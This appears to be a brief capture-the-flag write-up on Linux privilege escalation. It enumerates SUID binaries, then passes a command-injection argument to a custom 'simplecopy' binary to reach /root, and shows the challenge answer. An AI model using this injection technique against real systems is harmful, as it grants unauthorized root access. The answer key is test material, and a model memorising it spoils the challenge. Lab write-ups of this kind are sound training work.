# Linux PrivEsc

## Findings

1. Finding SUID executables (`find / -perm -u=s -type f 2>/dev/null`)

   ```sh
   /usr/bin/chfn
   /usr/bin/chsh
   /usr/bin/mount
   /usr/bin/newgrp
   /usr/bin/su
   /usr/bin/gpasswd
   /usr/bin/umount
   /usr/bin/passwd
   /usr/bin/simplecopy
   ```

2. Command Injection

   ```sh
   simplecopy "a.txt;cd /root;" "./runmetoanswer"
   ```

## Answer

```sh
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```
